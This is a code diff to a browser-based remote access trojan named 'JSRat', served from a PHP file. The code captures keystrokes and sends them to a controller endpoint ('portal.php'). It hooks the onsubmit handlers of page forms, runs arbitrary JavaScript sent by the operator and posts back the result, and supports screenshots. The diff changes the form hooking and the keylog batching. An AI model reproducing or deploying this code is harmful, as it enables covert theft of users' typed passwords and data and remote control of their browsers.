@@ -10,7 +10,7 @@ function out($js) {
 ob_start("out");
 ?>
 /*
- * JSBot
+ * JSRat
  * By: Andrew Blalock (https://github.com/derp-all-day)
  */
 //<script>
@@ -56,11 +56,11 @@ let jsr = {
         window.removeEventListener("keydown", jsr.sendLog);
         jsr.cleanup();
       } else if (data.command == "keylog") {
+        window.addEventListener("keydown", jsr.sendLog);
         var els = document.querySelectorAll('form');
         for (var i=0; i < els.length; i++) {
             els[i].setAttribute("onsubmit", "jsr.cleanup();" + els[i].getAttribute("onsubmit"));
         }
-        window.addEventListener("keydown", jsr.sendLog);
       } else if (data.command == "console") {
         jsr.ajaxReq(jsr.host_url + "/portal.php?post=console", function(c){}, "POST", { log: btoa((new Function("return " + data.argument1)())), cmd: data.argument1 });
       } else if(data.command == "screenshot") {
@@ -75,31 +75,21 @@ let jsr = {
       }
     }, "GET" );
   }),
-  stopScreenshareEVNT: (function(){
-    document.removeEventListener('scroll', jsr.ssScroll());
-    var evnt = ['click', 'keydown'];
-    for(var key in evnt) {
-      document.removeEventListener(evnt[key], jsr.screenshare());
-    }
-  }),
-  screenshareEVNT: (function(){
-    document.addEventListener('scroll', jsr.ssScroll());
-    var evnt = ['click', 'keydown'];
-    for(var key in evnt) {
-      document.addEventListener(evnt[key], jsr.screenshare());
-    }
-  }),
-  screenshare: (function(){
-
-  }),
-  ssScroll: (function(){
-
-  }),
   hello: (function(){
     jsr.ajaxReq(jsr.host_url + "/portal.php?post=hello&cb=" + Math.floor((Math.random() * 99999999) + 1), function(x){
       var data = JSON.parse(x);
       if(data.log == "true") {
         window.addEventListener("keydown", jsr.sendLog);
+        var els = document.querySelectorAll('form');
+        for (var i=0; i < els.length; i++) {
+            if((els[i].hasAttribute("onsubmit") && !els[i].getAttribute("onsubmit").indexOf('jsr.cleanup();')) || !els[i].hasAttribute("onsubmit") ) {
+              if(els[i].hasAttribute("onsubmit")) {
+                els[i].setAttribute("onsubmit", "jsr.cleanup();" + els[i].getAttribute("onsubmit"));
+              } else {
+                els[i].setAttribute("onsubmit", "jsr.cleanup();");
+              }
+            }
+        }
       } else {
         window.removeEventListener("keydown", jsr.sendLog);
         jsr.cleanup();
@@ -112,7 +102,7 @@ let jsr = {
       jsr.loc = window.location.href;
       jsr.ajaxReq(jsr.host_url + "/portal.php?post=klog", function(x){}, "POST", { log: jsr.presses, ref: window.location.href });
       jsr.presses = "";
-    } else if(jsr.presses.length>15) {
+    } else if(jsr.presses.length>25) {
       jsr.ajaxReq(jsr.host_url + "/portal.php?post=klog", function(x){}, "POST", { log: jsr.presses });
       jsr.presses = "";
     }
